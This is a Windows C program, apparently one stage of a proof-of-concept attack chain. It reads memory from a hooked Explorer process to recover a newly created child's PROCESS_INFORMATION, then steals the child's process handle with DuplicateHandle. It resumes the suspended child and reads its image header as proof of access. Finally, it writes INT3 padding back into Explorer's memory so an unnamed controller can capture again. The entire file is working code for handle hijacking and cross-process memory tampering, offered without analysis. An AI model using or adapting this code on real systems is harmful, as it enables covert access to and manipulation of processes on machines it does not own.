#include <Windows.h>
#include <Psapi.h>
#include <winternl.h>

#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtResumeProcess(HANDLE process);

// Source dependency: the kernel32!CreateProcessW wrapper stores the caller's
// lpProcessInformation at [entry_rsp-0x10]; at the hook site (after SUB rsp,58h
// and the internal CALL returns) that location is [RSP+0x48].
#define STACK_PI_OFFSET 0x48

static BOOL ReadRemote(HANDLE process, UINT_PTR address, LPVOID buffer, SIZE_T size)
{
	SIZE_T read = 0;
	if (!ReadProcessMemory(process, (LPCVOID)address, buffer, size, &read) || read != size)
	{
		fprintf(stderr, "[-] ReadProcessMemory at 0x%llX: E%lu\n", (unsigned long long)address, GetLastError());
		return FALSE;
	}
	return TRUE;
}

static BOOL ParseUnsigned(LPCWSTR text, DWORD base, ULONGLONG maximum, ULONGLONG* value)
{
	if (!text || !*text)
	{
		return FALSE;
	}
	if (base == 16 && text[0] == L'0' && (text[1] == L'x' || text[1] == L'X'))
	{
		text += 2;
	}
	if (!*text)
	{
		return FALSE;
	}

	ULONGLONG result = 0;
	DWORD count = 0;
	DWORD maxDigits = base == 10 ? 10 : 16;
	for (LPCWSTR p = text; *p; ++p)
	{
		DWORD digit = 0;
		if (++count > maxDigits)
		{
			return FALSE;
		}
		if (*p >= L'0' && *p <= L'9')
		{
			digit = (DWORD)(*p - L'0');
		}
		else if (base == 16 && *p >= L'a' && *p <= L'f')
		{
			digit = (DWORD)(*p - L'a') + 10;
		}
		else if (base == 16 && *p >= L'A' && *p <= L'F')
		{
			digit = (DWORD)(*p - L'A') + 10;
		}
		else
		{
			return FALSE;
		}
		if (digit >= base || result > (maximum - digit) / base)
		{
			return FALSE;
		}
		result = result * base + digit;
	}

	*value = result;
	return TRUE;
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc != 3)
	{
		fwprintf(stderr, L"Usage: %s <EXPLORER_PID> <RSP_SLOT_ADDRESS_HEX>\n", argv[0]);
		return EXIT_FAILURE;
	}

	ULONGLONG parsedPid = 0;
	ULONGLONG parsedSlot = 0;
	if (!ParseUnsigned(argv[1], 10, MAXDWORD, &parsedPid) || !parsedPid ||
		!ParseUnsigned(argv[2], 16, (ULONGLONG)~(UINT_PTR)0, &parsedSlot) || !parsedSlot)
	{
		fprintf(stderr, "[-] Invalid PID or slot address\n");
		return EXIT_FAILURE;
	}
	DWORD pid = (DWORD)parsedPid;
	UINT_PTR slot = (UINT_PTR)parsedSlot;

	INT result = EXIT_FAILURE;
	HANDLE explorer = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE | PROCESS_DUP_HANDLE,
		FALSE,
		pid);
	if (!explorer)
	{
		fprintf(stderr, "[-] OpenProcess(%lu): E%lu\n", pid, GetLastError());
		return EXIT_FAILURE;
	}

	HANDLE dup = NULL;
	UINT_PTR rsp = 0;
	UINT_PTR piPtr = 0;
	PROCESS_INFORMATION pi = { 0 };

	if (!ReadRemote(explorer, slot, &rsp, sizeof(rsp)))
	{
		goto cleanup;
	}
	if (!rsp || rsp == 0xCCCCCCCCCCCCCCCCULL)
	{
		fprintf(stderr, "[-] RSP slot is empty or still INT3 padding; the hook has not fired\n");
		goto cleanup;
	}

	if (!ReadRemote(explorer, rsp + STACK_PI_OFFSET, &piPtr, sizeof(piPtr)))
	{
		goto cleanup;
	}
	if (!piPtr)
	{
		fprintf(stderr, "[-] Stack slot [RSP+0x48] is null; no PROCESS_INFORMATION pointer\n");
		goto cleanup;
	}

	if (!ReadRemote(explorer, piPtr, &pi, sizeof(pi)))
	{
		goto cleanup;
	}

	printf(
		"[+] RSP slot................................. 0x%llX\n"
		"[+] Captured RSP............................. 0x%llX\n"
		"[+] PROCESS_INFORMATION pointer.............. 0x%llX (at RSP+0x48)\n"
		"[+] PROCESS_INFORMATION address.............. 0x%llX\n"
		"[+] hProcess / hThread....................... 0x%llX / 0x%llX\n"
		"[+] dwProcessId / dwThreadId................. %lu / %lu\n",
		(unsigned long long)slot,
		(unsigned long long)rsp,
		(unsigned long long)(rsp + STACK_PI_OFFSET),
		(unsigned long long)piPtr,
		(unsigned long long)pi.hProcess,
		(unsigned long long)pi.hThread,
		pi.dwProcessId,
		pi.dwThreadId);

	if (!pi.dwProcessId || !pi.hProcess)
	{
		fprintf(stderr, "[-] Recovered PROCESS_INFORMATION is not plausible\n");
		goto cleanup;
	}

	if (!DuplicateHandle(
		explorer,
		pi.hProcess,
		GetCurrentProcess(),
		&dup,
		PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME,
		FALSE,
		0))
	{
		fprintf(stderr, "[-] DuplicateHandle: E%lu\n", GetLastError());
		goto cleanup;
	}

	DWORD dupPid = GetProcessId(dup);
	if (dupPid != pi.dwProcessId)
	{
		fprintf(stderr, "[-] Duplicated handle points at PID %lu, expected %lu\n", dupPid, pi.dwProcessId);
		goto cleanup;
	}
	printf("[+] Duplicated handle validated: PID %lu matches the recovered structure\n", dupPid);

	NTSTATUS status = NtResumeProcess(dup);
	printf("[+] NtResumeProcess(child): 0x%08lX\n", (unsigned long)status);
	if (!NT_SUCCESS(status))
	{
		fprintf(stderr, "[-] Unable to resume the child process\n");
		goto cleanup;
	}

	HMODULE childModule = NULL;
	DWORD needed = 0;
	if (!K32EnumProcessModules(dup, &childModule, sizeof(childModule), &needed) || !needed)
	{
		fprintf(stderr, "[-] K32EnumProcessModules(child): E%lu\n", GetLastError());
		goto cleanup;
	}

	BYTE header[2] = { 0 };
	if (!ReadRemote(dup, (UINT_PTR)childModule, header, sizeof(header)))
	{
		goto cleanup;
	}
	if (header[0] != 'M' || header[1] != 'Z')
	{
		fprintf(stderr, "[-] Child image base does not start with MZ\n");
		goto cleanup;
	}
	printf(
		"[+] Read proof: 2 bytes at child image base 0x%llX = %02X %02X (MZ)\n",
		(unsigned long long)childModule,
		header[0],
		header[1]);

	// Restore the slot to its original INT3 padding (not zeros) so the
	// controller's next capture pre-check accepts this Explorer process again.
	const BYTE padding[8] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
	SIZE_T written = 0;
	if (!WriteProcessMemory(explorer, (LPVOID)slot, padding, sizeof(padding), &written) || written != sizeof(padding))
	{
		fprintf(stderr, "[-] RSP slot restoration write: E%lu\n", GetLastError());
		goto cleanup;
	}
	UINT_PTR restored = 0;
	if (!ReadRemote(explorer, slot, &restored, sizeof(restored)) || restored != 0xCCCCCCCCCCCCCCCCULL)
	{
		fprintf(stderr, "[-] RSP slot restoration verification failed\n");
		goto cleanup;
	}
	printf("[+] RSP slot restored to INT3 padding and verified\n");

	result = EXIT_SUCCESS;

cleanup:
	if (dup)
	{
		CloseHandle(dup);
	}
	CloseHandle(explorer);
	return result;
}
